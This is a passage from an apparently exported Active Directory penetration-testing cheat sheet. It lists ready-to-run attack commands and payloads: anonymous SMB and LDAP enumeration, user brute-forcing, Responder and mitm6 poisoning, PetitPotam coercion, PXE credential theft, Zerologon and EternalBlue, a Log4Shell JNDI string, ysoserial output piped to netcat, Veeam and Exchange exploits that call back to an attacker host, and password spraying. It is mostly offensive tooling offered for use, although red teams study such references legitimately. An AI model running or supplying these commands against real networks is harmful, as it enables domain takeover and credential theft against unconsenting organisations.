Zone transfer</p><p></p><p>dig axfr &lt;domain_name&gt; @&lt;name_server&gt;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Anonymous_&_Guest_access_on_SMB_shares_986.html"></a><h1 class='title level-3'>Anonymous & Guest access on SMB shares</h1><br/><p># No Credentials</p><p>## Anonymous &amp; Guest access on SMB shares</p><p></p><p>nxc smb &lt;ip_range&gt; -u &#39;&#39; -p &#39;&#39;</p><p></p><p>nxc smb &lt;ip_range&gt; -u &#39;a&#39; -p &#39;&#39;</p><p></p><p>enum4linux-ng.py -a -u &#39;&#39; -p &#39;&#39; &lt;ip&gt;</p><p></p><p>smbclient -U &#39;%&#39; -L //&lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Enumerate_LDAP_987.html"></a><h1 class='title level-3'>Enumerate LDAP</h1><br/><p># No Credentials</p><p>## Enumerate LDAP &gt;&gt;&gt; Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>nmap -n -sV --script &#39;ldap*&#39; and not brute -p 389 &lt;dc_ip&gt;</p><p></p><p>ldapsearch -x -H &lt;dc_ip&gt; -s base</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Enumerate_Users_988.html"></a><h1 class='title level-3'>Enumerate Users</h1><br/><p># No Credentials</p><p>## Enumerate Users &gt;&gt;&gt; Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>nxc smb &lt;dc_ip&gt; --users</p><p></p><p>nxc smb &lt;dc_ip&gt; --rid-brute 10000 # bruteforcing RID</p><p></p><p>net rpc group members &#39;Domain Users&#39; -W &#39;&lt;domain&gt; -l &lt;ip&gt; -U &#39;%&#39;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Bruteforce_users_989.html"></a><h1 class='title level-3'>Bruteforce users</h1><br/><p># No Credentials</p><p>## Bruteforce users &gt;&gt;&gt; Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>kerbrute userenum -d &lt;domain&gt; &lt;userlist&gt;</p><p></p><p>nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm= &#39;&lt;domain&gt;&#39;,userdb=&lt;user_list_file&gt;&quot; &lt;dc_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Poisoning_990.html"></a><h1 class='title level-3'>Poisoning</h1><br/><p># No Credentials</p><p>## Poisoning &gt;&gt;&gt; poisoning SMB || poisoning LDAP || poisoning HTTP [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]<ul><li>LLMNR / NBTNS / MDNS</li></ul></p><p>  - `responder -l &lt;interface&gt;`<ul><li>⚠️ DHCPv6 (IPv6 prefered to IPv4)</li></ul></p><p>  - `mitm6 -d &lt;domain&gt;`</p><p>  - `bettercap`<ul><li>⚠️ ARP Poisoning</li></ul></p><p>  - `bettercap`</p><p>  - `asreqroast`</p><p>    - `Pcredz -i &lt;interface&gt; -v` &gt;&gt;&gt; Hash found ASREQ</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Poisoning--LLMNR_-_NBTNS_-_MDNS_1118.html"></a><h1 class='title level-4'>LLMNR / NBTNS / MDNS</h1><br/><p># No Credentials</p><p>## Poisoning &gt;&gt;&gt; poisoning SMB || poisoning LDAP || poisoning HTTP [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p></p><p>responder -l &lt;interface&gt;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Poisoning--⚠️_DHCPv6_(IPv6_prefered_to_IPv4)_1119.html"></a><h1 class='title level-4'>⚠️ DHCPv6 (IPv6 prefered to IPv4)</h1><br/><p># No Credentials</p><p>## Poisoning &gt;&gt;&gt; poisoning SMB || poisoning LDAP || poisoning HTTP [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p></p><p>mitm6 -d &lt;domain&gt;</p><p></p><p>bettercap</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Poisoning--⚠️_ARP_Poisoning_1120.html"></a><h1 class='title level-4'>⚠️ ARP Poisoning</h1><br/><p># No Credentials</p><p>## Poisoning &gt;&gt;&gt; poisoning SMB || poisoning LDAP || poisoning HTTP [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p>### ⚠️ ARP Poisoning</p><p></p><p>bettercap</p><p></p><p>asreqroast</p><p>&gt;&gt;	Pcredz -i &lt;interface&gt; -v` &gt;&gt;&gt; Hash found ASREQ [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Poisoning--⚠️_ARP_Poisoning--bettercap_1122.html"></a><h1 class='title level-5'>bettercap</h1><br/><p># No Credentials</p><p>## Poisoning &gt;&gt;&gt; poisoning SMB || poisoning LDAP || poisoning HTTP [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p>### ⚠️ ARP Poisoning</p><p></p><p>bettercap</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Poisoning--⚠️_ARP_Poisoning--asreqroast_1121.html"></a><h1 class='title level-5'>asreqroast</h1><br/><p># No Credentials</p><p>## Poisoning &gt;&gt;&gt; poisoning SMB || poisoning LDAP || poisoning HTTP [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p>### ⚠️ ARP Poisoning</p><p></p><p>Pcredz -i &lt;interface&gt; -v &gt;&gt;&gt; Hash found ASREQ [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Coerce_991.html"></a><h1 class='title level-3'>Coerce</h1><br/><p># No Credentials</p><p>## Coerce &gt;&gt;&gt; Coerce SMB [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]<ul><li>Unauthenticated PetitPotam (CVE-2022-26925) @CVE@</li></ul></p><p>  - `petitpotam.py -d &lt;domain&gt; &lt;listener&gt; &lt;target&gt;`</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Coerce--Unauthenticated_PetitPotam_(CVE-2022-26925)_@CVE@_1123.html"></a><h1 class='title level-4'>Unauthenticated PetitPotam (CVE-2022-26925) @CVE@</h1><br/><p># No Credentials</p><p>## Coerce &gt;&gt;&gt; Coerce SMB [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p>### Unauthenticated PetitPotam (CVE-2022-26925) @CVE@</p><p></p><p>petitpotam.py -d &lt;domain&gt; &lt;listener&gt; &lt;target&gt;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--PXE_992.html"></a><h1 class='title level-3'>PXE</h1><br/><p># No Credentials</p><p>## PXE<ul><li>no password &gt;&gt;&gt; Credentials (NAA account) [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</li></ul></p><p>  - `pxethief.py 1`</p><p>  - `pxethief.py 2 &lt;distribution_point_ip&gt;`<ul><li>password protected &gt;&gt;&gt; PXE Hash  [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</li></ul></p><p>  - `tftp -i &lt;dp_ip&gt; GET &quot;\xxx\boot.var&quot;`</p><p>  - `pxethief.py 5 &#39;\xxx\boot.var&#39;`</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--PXE--no_password__Credentials_(NAA_account)_1124.html"></a><h1 class='title level-4'>no password >>> Credentials (NAA account)</h1><br/><p># No Credentials</p><p>## PXE</p><p>## no password &gt;&gt;&gt; Credentials (NAA account)  [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>pxethief.py 1</p><p></p><p>pxethief.py 2 &lt;distribution_point_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--PXE--password_protected__PXE_Hash_1125.html"></a><h1 class='title level-4'>password protected >>> PXE Hash</h1><br/><p># No Credentials</p><p>## PXE</p><p>## password protected &gt;&gt;&gt; PXE Hash  [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p></p><p>tftp -i &lt;dp_ip&gt; GET &quot;\xxx\boot.var&quot;</p><p></p><p>pxethief.py 5 &#39;\xxx\boot.var&#39;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--TimeRoasting_993.html"></a><h1 class='title level-3'>TimeRoasting</h1><br/><p># No Credentials</p><p>## TimeRoasting &gt;&gt;&gt; timeroast hash  [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p></p><p>timeroast.py &lt;dc_ip&gt; -o &lt;output_log&gt;</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise_967.html"></a><h1 class='title level-2'>Quick Compromise</h1><br/><p><ul><li>Zerologon exploit (<code>zerologon-scan</code>, <code>cve-2020-1472-exploit.py</code>)</li></ul></p><p> • <strong>Intent:</strong> Abuse CVE-2020-1472 to reset DC machine account.</p><p> • <strong>Purpose:</strong> Instantly escalate to Domain Admin.</p><p><ul><li>EternalBlue MS17-010 (<code>ms17_010_eternalblue</code>)</li></ul></p><p> • <strong>Intent:</strong> Exploit SMBv1 buffer overflow.</p><p> • <strong>Purpose:</strong> Gain SYSTEM/admin from unauth SMB vuln.</p><p><ul><li>Tomcat/JBoss Manager exploits</li></ul></p><p> • <strong>Intent:</strong> Deploy WAR or abuse JMX.</p><p> • <strong>Purpose:</strong> Gain admin code execution.</p><p><ul><li>Java RMI / Serialized port</li></ul></p><p> • <strong>Intent:</strong> Exploit remote Java services.</p><p> • <strong>Purpose:</strong> RCE → admin foothold.</p><p><ul><li>Log4Shell <code>${jndi:ldap://…}</code></li></ul></p><p> • <strong>Intent:</strong> Exploit JNDI injection.</p><p> • <strong>Purpose:</strong> Gain shell from vulnerable apps.</p><p><ul><li>Database (<code>mssql_enum_sql_logins</code>)</li></ul></p><p> • <strong>Intent:</strong> Brute/enumerate DB creds.</p><p> • <strong>Purpose:</strong> Pivot into DB for lateral move.</p><p><ul><li>Exchange ProxyShell</li></ul></p><p> • <strong>Intent:</strong> Exploit SSRF/RCE in Exchange.</p><p> • <strong>Purpose:</strong> Admin execution.</p><p><ul><li>Veeam CVEs (27532, 29849, 29855, 40711)</li></ul></p><p> • <strong>Intent:</strong> Abuse Veeam auth bypass/unserialize flaws.</p><p> • <strong>Purpose:</strong> Extract creds or execute code → user/admin access.</p><p><ul><li>GLPI CVEs (35914, 41320)</li></ul></p><p> • <strong>Intent:</strong> Exploit PHP injection / RCE.</p><p> • <strong>Purpose:</strong> Gain admin or low-priv foothold.</p><p><ul><li>Weak web/services scanning (<code>nuclei</code>, <code>nessus</code>)</li></ul></p><p> • <strong>Intent:</strong> Automated vuln scanning.</p><p> • <strong>Purpose:</strong> Identify “low-hanging” misconfigs.</p><p></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--⚠️_Zerologon_(unsafe)_CVE-2020-1472_994.html"></a><h1 class='title level-3'>⚠️ Zerologon (unsafe) CVE-2020-1472</h1><br/><p># Quick Compromise</p><p>## ⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@ &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p></p><p>zerologon-scan &#39;&lt;dc_netbios_name&gt;&#39; &#39;&lt;ip&gt;&#39;</p><p></p><p>cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Eternal_Blue_MS17-010_995.html"></a><h1 class='title level-3'>Eternal Blue MS17-010</h1><br/><p># Quick Compromise</p><p>## Eternal Blue MS17-010 @CVE@ &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>msf&gt; exploit/windows/smb/ms17_010_eternalblue # SMBv1 only</p><p></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Tomcat-Jboss_Manager_996.html"></a><h1 class='title level-3'>Tomcat/Jboss Manager</h1><br/><p># Quick Compromise</p><p>## Tomcat/Jboss Manager &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>msf&gt; auxiliary/scanner/http/tomcat_enum</p><p></p><p>msf&gt; exploit/multi/http/tomcat_mgr_deploy</p><p></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Java_RMI_997.html"></a><h1 class='title level-3'>Java RMI</h1><br/><p># Quick Compromise</p><p>## Java RMI &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>msf&gt; use exploit/multi/misc/java_rmi_server</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Java_Serialiszed_port_998.html"></a><h1 class='title level-3'>Java Serialiszed port</h1><br/><p># Quick Compromise</p><p>## Java Serialiszed port &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>ysoserial.jar &lt;gadget&gt; &#39;&lt;cmd&gt;&#39; |nc &lt;ip&gt; &lt;port&gt;</p><p></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Log4shell_999.html"></a><h1 class='title level-3'>Log4shell</h1><br/><p># Quick Compromise</p><p>## Log4shell &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>${jndi:ldap://&lt;ip&gt;:&lt;port&gt;/o=reference}</p><p></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Database_1000.html"></a><h1 class='title level-3'>Database</h1><br/><p># Quick Compromise</p><p>## Database &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>msf&gt; use auxiliary/admin/mssql/mssql_enum_sql_logins</p><p></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Exchange_1001.html"></a><h1 class='title level-3'>Exchange</h1><br/><p># Quick Compromise</p><p>## Exchange &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]<ul><li>Proxyshell @CVE@</li></ul></p><p>  - `proxyshell_rce.py -u <a href="https://">https://</a>&lt;exchange&gt; -e administrator@&lt;domain&gt;&#39;</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Exchange--Proxyshell_@CVE@_1115.html"></a><h1 class='title level-4'>Proxyshell @CVE@</h1><br/><p># Quick Compromise</p><p>## Exchange &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>### Proxyshell @CVE@</p><p></p><p>proxyshell_rce.py -u <a href="https://">https://</a>&lt;exchange&gt; -e administrator@&lt;domain&gt;</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Veeam_1002.html"></a><h1 class='title level-3'>Veeam</h1><br/><p># Quick Compromise</p><p>## Veeam &gt;&gt;&gt; User Account [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]<ul><li>CVE-2023-27532 (creds - Veeam backup) @CVE@</li></ul></p><p>  - `VeeamHax.exe --target &lt;veeam_server&gt;`</p><p>  - `CVE-2023-27532 net.tcp:/&lt;target&gt;:&lt;port&gt;/`<ul><li>CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager) @CVE@</li></ul></p><p>  - `CVE-2024-29849.py --target <a href="https://">https://</a>&lt;veeam_ip&gt;:&lt;veeam_port&gt;/ --callback-server &lt;attacker_ip&gt;:&lt;port&gt;`<ul><li>CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator) @CVE@</li></ul></p><p>  - `CVE-2024-29855.py  --start_time &lt;start_time_epoch&gt; --end_time &lt;end_time_epoch&gt; --username &lt;user&gt;@&lt;domain&gt; --target <a href="https://">https://</a>&lt;veeam_ip&gt;:&lt;veeam_port&gt;/`<ul><li>CVE-2024-40711 (unserialize - Veeam backup) @CVE@</li></ul></p><p>  - `CVE-2024-40711.exe -f binaryformatter -g Veeam -c <a href="http://">http://</a>&lt;attacker_ip&gt;:8000/trigger --targetveeam &lt;veeam_ip&gt;`</p><p></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Veeam--CVE-2023-27532_(creds_-_Veeam_backup)_@CVE@_1111.html"></a><h1 class='title level-4'>CVE-2023-27532 (creds - Veeam backup) @CVE@</h1><br/><p># Quick Compromise</p><p>## Veeam &gt;&gt;&gt; User Account [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>VeeamHax.exe --target &lt;veeam_server&gt;</p><p></p><p>CVE-2023-27532 net.tcp:/&lt;target&gt;:&lt;port&gt;/</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Veeam--CVE-2024-29849_(auth_bypass_-_Veeam_Backup_Enterprise_Manager)_@CVE@_1112.html"></a><h1 class='title level-4'>CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager) @CVE@</h1><br/><p># Quick Compromise</p><p>## Veeam &gt;&gt;&gt; User Account [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>CVE-2024-29849.py --target <a href="https://">https://</a>&lt;veeam_ip&gt;:&lt;veeam_port&gt;/ --callback-server &lt;attacker_ip&gt;:&lt;port&gt;</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Veeam--CVE-2024-29855_(auth_bypass_-_Veeam_Recovery_Orchestrator)_@CVE@_1113.html"></a><h1 class='title level-4'>CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator) @CVE@</h1><br/><p># Quick Compromise</p><p>## Veeam &gt;&gt;&gt; User Account [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>CVE-2024-29855.py  --start_time &lt;start_time_epoch&gt; --end_time &lt;end_time_epoch&gt; --username &lt;user&gt;@&lt;domain&gt; --target <a href="https://">https://</a>&lt;veeam_ip&gt;:&lt;veeam_port&gt;/</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Veeam--CVE-2024-40711_(unserialize_-_Veeam_backup)_@CVE@_1114.html"></a><h1 class='title level-4'>CVE-2024-40711 (unserialize - Veeam backup) @CVE@</h1><br/><p># Quick Compromise</p><p>## Veeam &gt;&gt;&gt; User Account [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>CVE-2024-40711.exe -f binaryformatter -g Veeam -c <a href="http://">http://</a>&lt;attacker_ip&gt;:8000/trigger --targetveeam &lt;veeam_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--GLPI_1003.html"></a><h1 class='title level-3'>GLPI</h1><br/><p># Quick Compromise</p><p>## GLPI &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]<ul><li>CVE-2022-35914 @CVE@</li></ul></p><p>  - /vendor/htmlawed/htmlawed/htmLawedTest.php<ul><li>CVE_2023_41320 @CVE@</li></ul></p><p>  - `cve_2023_41320.py -u &lt;user&gt; -p &lt;password&gt; -t &lt;ip&gt;`</p><p></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--GLPI--CVE-2022-35914_@CVE@_1116.html"></a><h1 class='title level-4'>CVE-2022-35914 @CVE@</h1><br/><p># Quick Compromise</p><p>## GLPI &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>/vendor/htmlawed/htmlawed/htmLawedTest.php</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--GLPI--CVE_2023_41320_@CVE@_1117.html"></a><h1 class='title level-4'>CVE_2023_41320 @CVE@</h1><br/><p># Quick Compromise</p><p>## GLPI &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>] || Low access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>cve_2023_41320.py -u &lt;user&gt; -p &lt;password&gt; -t &lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Weak_websites_-_services_1004.html"></a><h1 class='title level-3'>Weak websites / services</h1><br/><p># Quick Compromise</p><p>## Weak websites / services<ul><li>nuclei</li></ul></p><p>  - `nuclei -target &lt;ip_range&gt;`<ul><li>nessus</li></ul></p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Weak_websites_-_services--nuclei_1126.html"></a><h1 class='title level-4'>nuclei</h1><br/><p># Quick Compromise</p><p>## Weak websites / services</p><p></p><p>nuclei -target &lt;ip_range&gt;</p></div><div class='page'><a name="Domain_Dominance--Quick_Compromise--Weak_websites_-_services--nessus_1127.html"></a><h1 class='title level-4'>nessus</h1><br/><p># Quick Compromise</p><p>## Weak websites / services</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)_968.html"></a><h1 class='title level-2'>Valid User (no password)</h1><br/><p><ul><li>Password policy enumeration (<code>nxc smb --pass-pol</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>ldeep</code>)</li></ul></p><p> • <strong>Intent:</strong> Get domain password policy.</p><p> • <strong>Purpose:</strong> Prep safe spraying.</p><p><ul><li>Password spray (user==password, usual passwords)</li></ul></p><p> • <strong>Intent:</strong> Attempt common creds.</p><p> • <strong>Purpose:</strong> Gain cleartext creds.</p><p><ul><li>ASREPRoast (GetNPUsers, Rubeus, nxc ldap)</li></ul></p><p> • <strong>Intent:</strong> Request ASREP for users w/o preauth.</p><p> • <strong>Purpose:</strong> Offline crack to recover pass.</p><p><ul><li>Blind Kerberoasting (<code>Rubeus keberoast</code>, <code>GetUserSPNs -no-preauth</code>)</li></ul></p><p> • <strong>Intent:</strong> Abuse ASREP for SPN users.</p><p> • <strong>Purpose:</strong> Crack TGS offline.</p><p><ul><li>CVE-2022-33679</li></ul></p><p> • <strong>Intent:</strong> Exploit MS Kerberos SPN auth bypass.</p><p> • <strong>Purpose:</strong> Lateral move with forged PTT.</p><p></p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--Password_Spray_1005.html"></a><h1 class='title level-3'>Password Spray</h1><br/><p># Valid user (no password)</p><p>## Password Spray<ul><li>Get password policy  (you need creds, but you should get the policy first to avoid locking accounts)</li></ul></p><p>  - default policy</p><p>    - `nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; --pass-pol`</p><p>[<a href="https://www.thehacker.recipes/ad/recon/password-policy">https://www.thehacker.recipes/ad/recon/password-policy</a>](<a href="https://www.thehacker.recipes/ad/recon/password-policy">https://www.thehacker.recipes/ad/recon/password-policy</a>)</p><p>    - `Get-ADDefaultDomainPasswordPolicy`</p><p>    - `ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; domain_policy`</p><p>  - Find Policy (Privileged)</p><p>    - `ldapsearch-ad.py --server &lt;dc&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; --type pass-pols`</p><p>    - `Get-ADFineGainedPasswordPolicy -filter *`</p><p>    - `ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; pso # can also be runned with a low priv account but less information will be available`<ul><li>⚠️ user == password &gt;&gt;&gt; Clear text Credentials</li></ul></p><p>  - `nxc smb &lt;dc_ip&gt; -u &lt;users.txt&gt; -p &lt;passwords.txt&gt; --no-bruteforce --continue-on-success`</p><p>  - `sprayhound -U &lt;users.txt&gt; -d &lt;domain&gt; -dc  &lt;dc_ip&gt;   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass`<ul><li>⚠️ usuals passwords  (SeasonYear!, Company123, ...) &gt;&gt;&gt; Clear text Credentials</li></ul></p><p>  - `nxc smb &lt;dc_ip&gt; -u &lt;users.txt&gt; -p &lt;password&gt; --continue-on-success`</p><p>  - `sprayhound -U &lt;users.txt&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc  &lt;dc_ip&gt;`</p><p>  - `kerbrute passwordspray -d &lt;domain&gt; &lt;users.txt&gt; &lt;password&gt;`</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--Password_Spray--Get_password_policy_1128.html"></a><h1 class='title level-4'>Get password policy</h1><br/><p># Valid user (no password)</p><p>## Password Spray<ul><li>Get password policy  (you need creds, but you should get the policy first to avoid locking accounts)</li></ul></p><p>  - default policy</p><p>    - `nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; --pass-pol`</p><p>[<a href="https://www.thehacker.recipes/ad/recon/password-policy">https://www.thehacker.recipes/ad/recon/password-policy</a>]</p><p>    - `Get-ADDefaultDomainPasswordPolicy`</p><p>    - `ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; domain_policy`</p><p>  - Find Policy (Privileged)</p><p>    - `ldapsearch-ad.py --server &lt;dc&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; --type pass-pols`</p><p>    - `Get-ADFineGainedPasswordPolicy -filter *`</p><p>    - `ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; pso # can also be runned with a low priv account but less information will be available`</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--Password_Spray--Get_password_policy--Default_Policy_1130.html"></a><h1 class='title level-5'>Default Policy</h1><br/><p># Valid user (no password)</p><p>## Password Spray</p><p>### Get password policy</p><p>#### Default Policy</p><p></p><p>nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; --pass-pol # <a href="https://www.thehacker.recipes/ad/recon/password-policy">https://www.thehacker.recipes/ad/recon/password-policy</a></p><p></p><p>Get-ADDefaultDomainPasswordPolicy</p><p></p><p>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; domain_policy</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--Password_Spray--Get_password_policy--Find_Policy_(Privileged)_1129.html"></a><h1 class='title level-5'>Find Policy (Privileged)</h1><br/><p># Valid user (no password)</p><p>## Password Spray</p><p>### Get password policy</p><p>#### Find Policy (Privileged)</p><p></p><p>ldapsearch-ad.py --server &lt;dc&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; --type pass-pols</p><p></p><p>Get-ADFineGainedPasswordPolicy -filter *</p><p></p><p>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; pso # can also be run with a low priv account but less information will be available</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--Password_Spray--⚠️_user_==_password_1270.html"></a><h1 class='title level-4'>⚠️ user == password</h1><br/><p># Valid user (no password)</p><p>## Password Spray</p><p>### ⚠️ user == password &gt;&gt;&gt; Clear text Credentials [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>nxc smb &lt;dc_ip&gt; -u &lt;users.txt&gt; -p &lt;passwords.txt&gt; --no-bruteforce --continue-on-success</p><p></p><p>sprayhound -U &lt;users.txt&gt; -d &lt;domain&gt; -dc  &lt;dc_ip&gt;   # add --lower to lowercase and --upper to uppercase. Add nothing to get only 